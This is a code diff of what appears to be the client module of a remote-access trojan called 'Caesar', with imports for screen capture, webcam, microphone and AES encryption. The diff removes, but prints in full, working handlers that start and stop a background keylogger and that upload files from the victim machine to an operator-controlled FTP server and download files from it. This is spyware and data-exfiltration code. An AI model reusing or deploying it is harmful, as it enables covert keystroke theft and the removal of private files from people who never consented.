@@ -1,20 +1,17 @@
 import os
+import cv2
+import time
+import struct
+import pickle
+import imutils
+import pyaudio
+import threading
+import numpy as np
+from Crypto import Random
 from PIL import ImageGrab
 from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
-from Crypto import Random
-import cv2
-import struct
-import time
-import pickle
-import numpy as np
-import imutils
-import pyaudio
-import ftplib
-import threading
-from keylogger import Keylogger
-
 
 
 class GeneralFeatures:
@@ -23,8 +20,6 @@ class GeneralFeatures:
             self.now = datetime.now()
             self.paudio = pyaudio.PyAudio()
             self.log = ""
-            self.Keylogger = Keylogger()
-            self.KeyloggerThread = None
             self.stop_event = threading.Event()
 
 
@@ -63,6 +58,7 @@ class GeneralFeatures:
                             file.close()
             except:
                 conn.send(self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
+
 
 
         # receives file from server
@@ -304,111 +300,6 @@ class GeneralFeatures:
                     #print(resp)
             except:
                 pass
-
-
-
-        #===================================================FTP FILE HANDLING===========================================
-
-        def client_folder_exist(self, ftp, folderId, client_id):
-            try:
-                if folderId in ftp.nlst():
-                    ftp.cwd(folderId)
-                else:
-                    ftp.mkd(folderId)
-                    ftp.cwd(folderId)
-
-                if client_id in ftp.nlst():
-                    ftp.cwd(client_id)
-                else:
-                    ftp.mkd(client_id)
-                    ftp.cwd(client_id)
-            except Exception as e:
-                pass
-                #print(e)
-
-
-
-        #uploads file to ftp server
-        def upload_file_via_ftp(self, conn, filename, FTP_PASS, folderId, client_id, FTP_HOST, FTP_USER):
-
-            try:
-                ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
-                self.client_folder_exist(ftp, folderId, client_id)
-
-                ftp.encoding = "utf-8"
-
-                with open(filename, "rb") as file:
-                    ftp.storbinary(f"STOR {filename}", file)
-                ftp.quit()
-
-                conn.send("[+] File has been uploaded!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-            except:
-                conn.send("[-] Something went wrong uploading file!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-
-
-        #downloads file from ftp server
-        def download_file_via_ftp(self, conn, filename, FTP_PASS, folderId, client_id, FTP_HOST, FTP_USER):
-
-            try:
-
-                ftp = ftplib.FTP(FTP_HOST, FTP_USER, FTP_PASS)
-                ftp.encoding = "utf-8"
-
-                self.client_folder_exist(ftp, folderId, client_id)
-
-                with open(filename, "wb") as file:
-                    ftp.retrbinary(f"RETR {filename}", file.write)
-                ftp.quit()
-
-                conn.send("[+] File has been Downloaded!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-
-            except Exception as e:
-                print(e)
-                conn.send("[-] Something went wrong downloading file: {e} \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-
-
-        #===================================================FTP FILE HANDLING===========================================
-
-
-
-        # ===================================================Keylogger==================================================
-
-        #starts keylogger
-        def keylogger_handler(self, conn, filename, folderId, client_id, FTP_HOST, FTP_USER, FTP_PASS):
-            try:
-                self.KeyloggerThread = threading.Thread(target=self.Keylogger.start_keylogger, args=(filename, folderId, client_id, FTP_HOST, FTP_USER, FTP_PASS))
-                self.KeyloggerThread.start()
-                conn.send("[+] Keylogger started!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-            except:
-                conn.send("[-] Unable to start keylogger!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-
-
-        #stops keylogger thread
-        def stop_keylogger(self, conn):
-            try:
-                if self.KeyloggerThread.is_alive():
-                    self.Keylogger.stop_timer()
-                    self.KeyloggerThread.join()
-                    conn.send("[+] Keylogger stopped!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-                else:
-                    conn.send("[+] Keylogger is not active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-            except Exception as e:
-                #print(e)
-                conn.send("[-]Error occurred while stopping keylogger!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(
-                    os.getcwd() + ": ").encode())
-
-
-        #confirms if keylogger is running
-        def is_keylogger_active(self, conn):
-            try:
-                if self.KeyloggerThread.is_alive():
-                    conn.send("[+] Keylogger is active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-                else:
-                    conn.send("[+] Keylogger is not active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-            except:
-                conn.send("[+] Keylogger is not active!!! \n".encode() + self.convert_text_bold_red('Caesar ').encode() + str(os.getcwd() + ": ").encode())
-
-        # ===================================================Keylogger==================================================
 
 
 
